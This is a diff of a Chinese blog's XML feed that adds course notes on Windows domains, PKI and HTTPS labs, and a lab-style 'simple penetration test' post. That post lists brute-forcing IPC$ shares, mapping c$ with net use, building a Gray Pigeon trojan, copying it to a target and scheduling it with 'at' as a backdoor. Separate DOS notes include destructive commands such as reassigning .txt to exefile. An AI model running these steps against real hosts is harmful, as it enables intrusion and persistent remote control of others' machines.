@@ -4,11 +4,65 @@
   
   
   <entry>
+    <title>简单渗透测试</title>
+    <link href="/2020/07/11/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%20day09/"/>
+    <url>/2020/07/11/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%20day09/</url>
+    
+    <content type="html"><![CDATA[<h2 id="0-授权"><a href="#0-授权" class="headerlink" title="0.授权"></a>0.授权</h2><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>  nslookup whois</p><h2 id="2-扫描漏洞"><a href="#2-扫描漏洞" class="headerlink" title="2.扫描漏洞"></a>2.扫描漏洞</h2><p>  namp=ip范围 端口 80（IIS，apache，什么网站）scanport<br>  高级扫描：如IIS漏洞2003-IIS6.0 2008IIS7.0<br>            扫描网站漏洞（）</p><h2 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3.漏洞利用"></a>3.漏洞利用</h2><h2 id="4-提权（shell环境、桌面环境、最高权限）"><a href="#4-提权（shell环境、桌面环境、最高权限）" class="headerlink" title="4.提权（shell环境、桌面环境、最高权限）"></a>4.提权（shell环境、桌面环境、最高权限）</h2><h2 id="5-毁尸灭迹"><a href="#5-毁尸灭迹" class="headerlink" title="5.毁尸灭迹"></a>5.毁尸灭迹</h2><h2 id="6-留后门"><a href="#6-留后门" class="headerlink" title="6.留后门"></a>6.留后门</h2><h2 id="7-渗透测试报告"><a href="#7-渗透测试报告" class="headerlink" title="7.渗透测试报告"></a>7.渗透测试报告</h2><p>手工测试端口号开放：<br>telnet IP地址 测试端口</p><p>1.scanport扫描445端口</p><p>2.漏洞利用之IPC$：<br>进行暴力破解：NTscan</p><p>3.</p><h1 id="net-use-10-1-1-2-ipc-密码-user-用户"><a href="#net-use-10-1-1-2-ipc-密码-user-用户" class="headerlink" title="net use  \10.1.1.2\ipc$ 密码 /user:用户"></a>net use  \10.1.1.2\ipc$ 密码 /user:用户</h1><p>net use f: \10.1.1.2\share 密码 /user:用户<br>net use f: /del<br>net use * /del</p><h1 id="net-use-f-10-1-1-2-c-密码-user-用户"><a href="#net-use-f-10-1-1-2-c-密码-user-用户" class="headerlink" title="net use f: \10.1.1.2\c$ 密码 /user:用户"></a>net use f: \10.1.1.2\c$ 密码 /user:用户</h1><p>4.制作木马<br>利用光盘上的灰鸽子软件</p><p>5.植入木马（留后门）<br>copy d:\heihei.exe \10.1.1.2\c$</p><p>6.设置计划任务自动执行木马：<br>net time \10.1.1.2<br>at \10.1.1.2 11:11 “c:\heihei.exe”</p><p>7.等待肉鸡上线</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>网络安全</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>网络</tag>
+      
+      <tag>安全</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>域</title>
     <link href="/2020/07/05/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8day07/"/>
     <url>/2020/07/05/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8day07/</url>
     
     <content type="html"><![CDATA[<h2 id="1-0-域Domain"><a href="#1-0-域Domain" class="headerlink" title="1.0 域Domain"></a>1.0 域Domain</h2><h2 id="2-内网环境："><a href="#2-内网环境：" class="headerlink" title="2.内网环境："></a>2.内网环境：</h2><p>  1）工作组：默认模式，人人平等，不方面管理<br>  2）域：人人不平等，集中管理，同一管理</p><h2 id="3-域的特点："><a href="#3-域的特点：" class="headerlink" title="3.域的特点："></a>3.域的特点：</h2><p>  集中/统一管理</p><h2 id="4-域的组成"><a href="#4-域的组成" class="headerlink" title="4.域的组成:"></a>4.域的组成:</h2><p>  1）域控制器: DC（Domain Controller）<br>  2）成员机</p><h2 id="5-域的部署："><a href="#5-域的部署：" class="headerlink" title="5.域的部署："></a>5.域的部署：</h2><p>  1）安装域控制器–就生成了域环境<br>  2）安装了活动目录–就生成了域控制器<br>  3）活动目录：Active Directory = AD</p><h2 id="6-活动目录"><a href="#6-活动目录" class="headerlink" title="6.活动目录"></a>6.活动目录</h2><p>  1）AD<br>  2）特点：集中管理/统一管理</p><h2 id="7-组策略GPO"><a href="#7-组策略GPO" class="headerlink" title="7.组策略GPO"></a>7.组策略GPO</h2><p>​     实现强制改变成员 的策略</p><h2 id="8-部署安装活动目录："><a href="#8-部署安装活动目录：" class="headerlink" title="8.部署安装活动目录："></a>8.部署安装活动目录：</h2><pre><code class="hljs angelscript"><span class="hljs-number">1</span>）开启<span class="hljs-number">2008</span>虚拟机，并桥接到vmnet2<span class="hljs-number">2</span>）配置静态IP地址<span class="hljs-number">10.1</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span>/<span class="hljs-number">24</span><span class="hljs-number">3</span>）开始-运行-输入dcpromo,安装活动目录。   弹出向导：   勾选DNS-新林中新建域-功能级别都设置为<span class="hljs-number">2003</span>-域的FQDN（qf.com）--设置目录服务还原密码<span class="hljs-number">666.</span>com-勾选安装后重启<span class="hljs-number">4</span>）在DC上登录域qf\administrator   DC的本地管理员升级为域管理员<span class="hljs-number">5</span>）验证AD是否安装成功：   <span class="hljs-number">1</span>-计算机右键属性-所属域   <span class="hljs-number">2</span>-DNS服务器中是否自动创建qf.com区域文件及   <span class="hljs-number">3</span>-自动注册DC的域名解析记录   <span class="hljs-number">4</span>-开始-管理工具-A D 用户和计算机     computer：普通域成员机列表     Domain Controller：DC列表     users：域账号</code></pre><h2 id="9-加入域"><a href="#9-加入域" class="headerlink" title="9.加入域"></a>9.加入域</h2><pre><code class="hljs angelscript"><span class="hljs-number">1.</span>配置IP，并指DNS<span class="hljs-number">2.</span>计算机右键属性--更改--加入qf.com域<span class="hljs-number">3.</span>重启加入域后，成功使用域用户登录成员机</code></pre><h2 id="10-常见小问题"><a href="#10-常见小问题" class="headerlink" title="10.常见小问题"></a>10.常见小问题</h2><pre><code class="hljs angelscript"><span class="hljs-number">1</span>）加入域不成功   网络是不是不通！   解析是否能成功解析！   是否为DNS缓存问题<span class="hljs-number">2</span>）登入域不成功如XP，已勾选登录域QF，不用再写qf\xiaofei.wen<span class="hljs-number">3</span>）域用户的权限   建议将域用户加入到普通成员机的本地管理员组中本地管理员组：administrators域管理员组：Domain Admins</code></pre><h2 id="11-OU-：组织单位"><a href="#11-OU-：组织单位" class="headerlink" title="11 OU ：组织单位"></a>11 OU ：组织单位</h2><p>作用：用于归类域资源（域用户、域计算机、域组）</p><h2 id="12-组策略：Group-Policy-GPO"><a href="#12-组策略：Group-Policy-GPO" class="headerlink" title="12  组策略：Group Policy = GPO"></a>12  组策略：Group Policy = GPO</h2><pre><code class="hljs stata">作用：通过组策略可以修改计算机的各种属性，如开始菜单、桌面背景、网络参数等。重点：组策略在域中，是基于<span class="hljs-keyword">OU</span>来下发的！！组策略在域中下发后，用户的应用顺序是：LSDOU在应用过程中，如果出现冲突，后应用的生效！正常情况下：LSDOU顺序上级<span class="hljs-keyword">OU</span>：        桌面：aa      运行：删除下级<span class="hljs-keyword">OU</span>：        桌面：未配置  运行：不删除下级<span class="hljs-keyword">OU</span>用户结果：桌面：aa      运行：不删除下级<span class="hljs-keyword">OU</span>设置了阻止继承：上级<span class="hljs-keyword">OU</span>：         桌面：aa     运行：删除下级<span class="hljs-keyword">OU</span>：         桌面：未配置 运行：不删除下级<span class="hljs-keyword">OU</span>用户结果： 桌面：未配置 运行：不删除上级设置了强制：上级<span class="hljs-keyword">OU</span>：           桌面：aa     运行：删除下级<span class="hljs-keyword">OU</span>：           桌面：未配置 运行：不删除下级<span class="hljs-keyword">OU</span>的用户结果： 桌面：aa   运行：删除注意：当上级强制和下级阻止继承同时设置，强制生效！</code></pre>]]></content>
+    
+    
+    <categories>
+      
+      <category>网络安全</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>网络</tag>
+      
+      <tag>安全</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>PKI</title>
+    <link href="/2020/07/05/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8day08/"/>
+    <url>/2020/07/05/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8day08/</url>
+    
+    <content type="html"><![CDATA[<h1 id="PKI"><a href="#PKI" class="headerlink" title="PKI"></a>PKI</h1><h2 id="1、PKI概述"><a href="#1、PKI概述" class="headerlink" title="1、PKI概述"></a>1、PKI概述</h2><p>名称：Public Key Infra…公钥基础设施<br>作用：通过加密技术和数字签名保证信息的安全<br>组成：公钥加密技术、数字证书、CA、RA</p><h2 id="2、信息安全三要素"><a href="#2、信息安全三要素" class="headerlink" title="2、信息安全三要素"></a>2、信息安全三要素</h2><p>机密性<br>完整性 保证数据的完整<br>身份验证/操作的不可否认性</p><h2 id="3-哪些IT领域用到PKI："><a href="#3-哪些IT领域用到PKI：" class="headerlink" title="3.哪些IT领域用到PKI："></a>3.哪些IT领域用到PKI：</h2><p>1）SSL/HTTPS<br>2）IPsecVPN<br>3）部分远程访问VPN</p><h2 id="4、公钥加密技术"><a href="#4、公钥加密技术" class="headerlink" title="4、公钥加密技术"></a>4、公钥加密技术</h2><p>作用：实现对信息加密、数字签名等安全保障<br>加密算法：</p><p>1）对称加密算法<br>         加解密的密钥一致！<br>             DES  3DES  AES</p><p> 2）非对称加密算法<br>        通信双方各自产生一对公私钥。<br>        双方各自交换公钥<br>        公钥和私钥为互相加解密关系！<br>        公私钥不可互相逆推！<br>        RSA  DH</p><p>x+5=y(对称加密算法）<br>x是原数据/原文<br>y是密文<br>5是key/密钥</p><p>HASH算法：MD5  SHA （验证完整性）<br>HASH值可逆么？不可逆！<br>HASH值=摘要</p><p>数字签名：<br>用自己的私钥对摘要加密得出的密文就是数字签名</p><h2 id="5证书："><a href="#5证书：" class="headerlink" title="5证书："></a>5证书：</h2><p>证书用于保证公密的合法性<br>证书格式遵循X.509标准<br>数字证书包含信息：<br> 使用者的公钥值<br> 使用者标识信息（如名称和电子邮件地址）<br> 有效期（证书的有效时间）<br> 颁发者标识信息<br> 颁发者的数字签名<br>数字证书由权威公正的第三方机构即CA签发</p><p>CA是权威证书颁发机构，为了公正“公钥”的合法性！<br>机密性：使用对方的公钥加密！<br>身份验证/数字签名：使用自己的私钥！</p><p>===========================================</p><p>实验名称：部署HTTPS服务器/部署SSL服务器</p><p>实验环境：<br>1）win2008作为https服务器：10.1.1.2/24<br>2）win7作为客户机：10.1.1.1/24<br>3）桥接到虚拟网络vmenet1</p><p>实验步骤：<br>1.配置服务器IP地址10.1.1.2/24。</p><p>2.安装IIS服务 并建立一个站点。(必须使用域名)并配置DNS服务器，并初步验证访问<a href="http://www.flower.com一下。" target="_blank" rel="noopener">http://www.flower.com一下。</a></p><p>3.安装CA组件</p><p>4.打开IIS，先生成证书申请文件</p><p>5.向CA申请证书：<br>  打开网页<a href="http://10.1.1.2/certsrv并向CA发送web服务器申请文件" target="_blank" rel="noopener">http://10.1.1.2/certsrv并向CA发送web服务器申请文件</a></p><p>6.CA颁发证书</p><p>7.在web服务器上下载并完成安装</p><p>8.在web服务器上启用SSL443</p><p>9.要求用户必须使用443访问，不能使用80访问！</p>]]></content>
     
     
     <categories>
@@ -301,33 +355,6 @@
   
   
   <entry>
-    <title>系统部署</title>
-    <link href="/2020/06/07/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A801/"/>
-    <url>/2020/06/07/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A801/</url>
-    
-    <content type="html"><![CDATA[<h1 id="vm"><a href="#vm" class="headerlink" title="vm"></a>vm</h1><h1 id="部署windows-xp系统"><a href="#部署windows-xp系统" class="headerlink" title="部署windows-xp系统"></a>部署windows-xp系统</h1><h2 id="一-配置虚拟机硬件并安装系统"><a href="#一-配置虚拟机硬件并安装系统" class="headerlink" title="一 配置虚拟机硬件并安装系统"></a>一 配置虚拟机硬件并安装系统</h2><p>1、在VMware文件目录下创建一个空文件夹将其命名位：winxp-1</p><p>2、打开VMware软件，点击创建新的虚拟机。</p><p>3、我们安装的是Windows系统，这里选择<strong>典型。</strong></p><p>4、这里点<strong>稍后安装</strong></p><p>5、这个根据你下载的镜像资源来选择，我给大家的是xp profession(专业版)，默认32位，xp系统是比较老的系统了，点32位默认就可以了。</p>]]></content>
-    
-    
-    <categories>
-      
-      <category>网络安全</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>网络</tag>
-      
-      <tag>安全</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
     <title>ip地址详解</title>
     <link href="/2020/06/07/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A802/"/>
     <url>/2020/06/07/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A802/</url>
@@ -360,6 +387,33 @@
     <url>/2020/06/07/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A805/</url>
     
     <content type="html"><![CDATA[<p>1、重定向符号:</p><p>1&gt; 正确输出<br>2&gt; 错误输出</p><blockquote><blockquote><p>为追加<br>为覆盖</p></blockquote></blockquote><ol start="3"><li>rd . /s/q</li></ol><p>4.<br>type 文件名.扩展名 | more<br>分页显示<br>dir c:\windows | more</p><p>5.创建文件<br>1)echo<br>2)<br>copy con 文件名.扩展名<br>开始编辑内容<br>ctrl+z回车结束编写</p><p>6.快速生成一个空文件<br>fsutil file createnew c:\windows\system.ini 409600000</p><p>7.修改关联：<br>assoc .txt=exefile</p><p>8.shutdown -s -f -t 秒 -c “”</p><p>9.ren  旧名  新名</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>网络安全</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>网络</tag>
+      
+      <tag>安全</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>系统部署</title>
+    <link href="/2020/06/07/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A801/"/>
+    <url>/2020/06/07/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A801/</url>
+    
+    <content type="html"><![CDATA[<h1 id="vm"><a href="#vm" class="headerlink" title="vm"></a>vm</h1><h1 id="部署windows-xp系统"><a href="#部署windows-xp系统" class="headerlink" title="部署windows-xp系统"></a>部署windows-xp系统</h1><h2 id="一-配置虚拟机硬件并安装系统"><a href="#一-配置虚拟机硬件并安装系统" class="headerlink" title="一 配置虚拟机硬件并安装系统"></a>一 配置虚拟机硬件并安装系统</h2><p>1、在VMware文件目录下创建一个空文件夹将其命名位：winxp-1</p><p>2、打开VMware软件，点击创建新的虚拟机。</p><p>3、我们安装的是Windows系统，这里选择<strong>典型。</strong></p><p>4、这里点<strong>稍后安装</strong></p><p>5、这个根据你下载的镜像资源来选择，我给大家的是xp profession(专业版)，默认32位，xp系统是比较老的系统了，点32位默认就可以了。</p>]]></content>
     
     
     <categories>
